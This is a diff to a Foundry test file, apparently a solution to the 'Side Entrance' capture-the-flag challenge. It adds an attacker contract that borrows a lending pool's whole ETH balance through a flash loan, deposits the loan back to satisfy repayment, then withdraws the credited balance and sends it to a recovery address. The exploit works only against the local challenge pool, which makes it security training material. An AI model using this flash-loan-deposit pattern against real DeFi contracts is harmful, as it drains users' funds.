@@ -5,6 +5,8 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -45,6 +47,11 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
+        FlashLoanReciever flashLoanReciever = new FlashLoanReciever(pool);
+        flashLoanReciever.callFlashloan(recovery);
+
+
+
         
     }
 
@@ -55,4 +62,31 @@ contract SideEntranceChallenge is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract FlashLoanReciever is IFlashLoanEtherReceiver {
+
+    SideEntranceLenderPool sideEntrance;
+
+    constructor(SideEntranceLenderPool _sideEntrance){
+        sideEntrance = _sideEntrance;
+
+
+    }
+
+    function execute() public payable {
+        sideEntrance.deposit{value: address(this).balance}();
+    }
+
+    function callFlashloan(address recovery) public {
+        address(sideEntrance).call{value: 0}(abi.encodeWithSelector(sideEntrance.flashLoan.selector, address(sideEntrance).balance));
+        sideEntrance.withdraw();
+        payable(recovery).call{value: address(this).balance}("");
+    }
+
+    receive() external payable {}
 }
